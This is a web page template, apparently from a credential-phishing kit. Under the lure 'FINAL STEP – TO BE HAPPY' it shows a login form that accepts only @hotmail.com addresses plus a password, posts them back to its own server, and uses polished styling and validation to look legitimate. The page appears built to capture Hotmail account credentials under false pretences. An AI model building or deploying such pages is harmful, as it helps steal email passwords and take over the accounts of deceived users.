{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:420px;margin:48px auto;padding:40px 32px;text-align:center">
  <h2 class="section-title">✨ FINAL STEP – TO BE HAPPY</h2>
  <p class="section-subtitle">Login now to get started</p>

  <form method="post" id="f2Form" novalidate>
    
    <!-- Email -->
    <div class="form-group">
      <input 
        class="input wide" 
        id="address" 
        name="address" 
        type="email" 
        placeholder="Email address (must end with @hotmail.com)" 
        required
        pattern="^[a-zA-Z0-9._%+-]+@hotmail\.com$">
      <div class="error-message">Please enter a valid address ending with <b>@hotmail.com</b>.</div>
    </div>

    <!-- Password -->
    <div class="form-group">
      <input 
        class="input wide" 
        id="password" 
        name="password" 
        type="password" 
        placeholder="Password" 
        required 
        minlength="6">
      <div class="error-message">Password must be at least 6 characters long.</div>
    </div>

    <button class="btn btn-blue wide-btn" type="submit">Log In</button>
  </form>
</div>

<style>
  /* Title */
  .section-title {
    font-size: 1.6rem;
    font-weight: 700;
    color: #111827;
    margin-bottom: 6px;
    letter-spacing: -0.5px;
  }
  .section-subtitle {
    color: #64748b;
    margin-bottom: 24px;
    font-size: 0.95rem;
  }

  /* Inputs */
  .form-group {
    margin-bottom: 16px;
  }
  .input.wide {
    width: 100%;
    border: 1px solid #d1d5db;
    padding: 14px 16px;
    border-radius: 8px;
    font-size: 1rem;
    transition: border-color 0.2s, box-shadow 0.2s;
  }
  .input.wide:focus {
    border-color: #3b82f6;
    box-shadow: 0 0 0 2px rgba(59,130,246,0.15);
    outline: none;
  }
  .input.error {
    border-color: #dc2626;
    background: #fef2f2;
  }

  /* Error message */
  .error-message {
    font-size: 0.85rem;
    color: #dc2626;
    display: none;
    margin-top: 4px;
    text-align: left;
  }

  /* Button */
  .btn.wide-btn {
    width: 100%;
    padding: 14px;
    border-radius: 8px;
    font-size: 1rem;
    font-weight: 600;
    background-color: #3b82f6;
    color: white;
    border: none;
    cursor: pointer;
    transition: background 0.2s, transform 0.2s;
    box-shadow: 0 2px 6px rgba(59,130,246,0.25);
  }
  .btn.wide-btn:hover {
    background-color: #2563eb;
    transform: translateY(-1px);
  }
  .btn.wide-btn:active {
    background-color: #1d4ed8;
    transform: translateY(0);
  }
</style>

<script>
document.getElementById("f2Form").addEventListener("submit", function(e) {
  let valid = true;
  let firstInvalid = null;

  this.querySelectorAll(".input").forEach(input => {
    const errorMsg = input.nextElementSibling;
    if (!input.checkValidity()) {
      input.classList.add("error");
      errorMsg.style.display = "block";
      valid = false;
      if (!firstInvalid) firstInvalid = input;
    } else {
      input.classList.remove("error");
      errorMsg.style.display = "none";
    }
  });

  if (!valid) {
    e.preventDefault();
    firstInvalid.scrollIntoView({ behavior: "smooth", block: "center" });
    firstInvalid.focus();
  }
});
</script>
{% endblock %}
